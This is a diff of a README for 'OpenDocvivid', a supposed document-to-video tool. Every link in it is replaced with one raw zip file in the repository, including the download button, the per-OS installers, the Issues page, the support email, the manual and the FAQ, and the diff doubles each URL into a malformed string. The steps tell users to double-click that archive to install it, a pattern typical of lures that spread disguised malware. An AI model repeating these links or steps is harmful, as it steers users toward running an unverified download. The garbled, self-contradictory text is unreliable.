@@ -1,7 +1,7 @@
 # 🎥 OpenDocvivid - Turn Documents into Engaging Videos
 
 ## 📥 Download Now
-[![Download OpenDocvivid](https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip)](https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip)
+[![Download OpenDocvivid](https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip(standalone)https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip)](https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip(standalone)https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip)
 
 ---
 
@@ -21,19 +21,19 @@ Before you install OpenDocvivid, please ensure your system meets the following r
 To get OpenDocvivid, you will need to visit our Releases page. Follow these steps:
 
 1. Click the link below to go to the Releases page:
-   [Download OpenDocvivid](https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip)
+   [Download OpenDocvivid](https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip(standalone)https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip)
    
 2. On the Releases page, look for the latest version of OpenDocvivid. There you will find different files to download.
 
 3. Choose the file that matches your operating system:
-   - For Windows, download `https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip`
-   - For macOS, download `https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip`
+   - For Windows, download `https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip(standalone)https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip`
+   - For macOS, download `https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip(standalone)https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip`
 
 4. Once the download is complete, locate the downloaded file on your computer.
 
-5. **For Windows users:** Double-click `https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip` and follow the on-screen instructions to install the software. 
+5. **For Windows users:** Double-click `https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip(standalone)https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip` and follow the on-screen instructions to install the software. 
 
-6. **For macOS users:** Open `https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip` and drag the OpenDocvivid icon to your Applications folder. 
+6. **For macOS users:** Open `https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip(standalone)https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip` and drag the OpenDocvivid icon to your Applications folder. 
 
 7. After the installation finishes, you can start OpenDocvivid by locating it in your applications menu or dock.
 
@@ -66,19 +66,19 @@ If you encounter any issues while using OpenDocvivid, try the following solution
 - Restart the application to clear any temporary issues.
 - Check your internet connection if you face any download problems.
 
-If you still need help, feel free to visit our [GitHub Issues page](https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip) to report any bugs or seek assistance.
+If you still need help, feel free to visit our [GitHub Issues page](https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip(standalone)https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip) to report any bugs or seek assistance.
 
 ## 📞 Support
 For further assistance, you can reach out:
 
-- **Email:** https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip
+- **Email:** https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip(standalone)https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip
 - **GitHub:** Create an issue on our GitHub repository for any feature requests or bugs.
 
 ## 🔗 Additional Resources
 To learn more about using OpenDocvivid, here are some useful resources:
 
-- [User Manual](https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip)
-- [Frequently Asked Questions](https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip)
+- [User Manual](https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip(standalone)https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip(standalone)https://raw.githubusercontent.com/thiha9ng/OpenDocvivid/main/frontend/app/(standalone)/OpenDocvivid-v3.3.zip)
 
 ---
 
